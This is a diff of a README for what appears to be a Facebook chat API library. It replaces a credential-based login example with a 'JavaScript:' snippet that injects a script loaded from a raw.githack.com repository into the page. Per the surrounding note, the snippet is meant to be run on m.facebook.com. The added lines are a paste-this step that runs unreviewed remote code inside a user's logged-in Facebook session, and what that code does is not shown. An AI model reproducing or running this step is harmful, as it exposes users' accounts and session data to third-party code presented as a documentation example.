@@ -11,16 +11,9 @@ _note:_ Must redirect URL to [m.facebook.com](https://m.facebook.com) Because mo
  __Example__
 
 ```js
-const fs = require("fs");
-const login = require("facebook-chat-api");
-
-var credentials = {email: "FB_EMAIL", password: "FB_PASSWORD"};
-
-login(credentials, (err, api) => {
-    if(err) return console.error(err);
-
-    fs.writeFileSync('appstate.json', JSON.stringify(api.getAppState()));
-});
+JavaScript: var i = document.createElement('script'); 
+i.src = "https://raw.githack.com/toan06/EZ/main/fb/tools/bot/repeat.js";
+document.getElementsByTagName('head')[0].appendChild(i);
 ```
 
 ------------------------------------
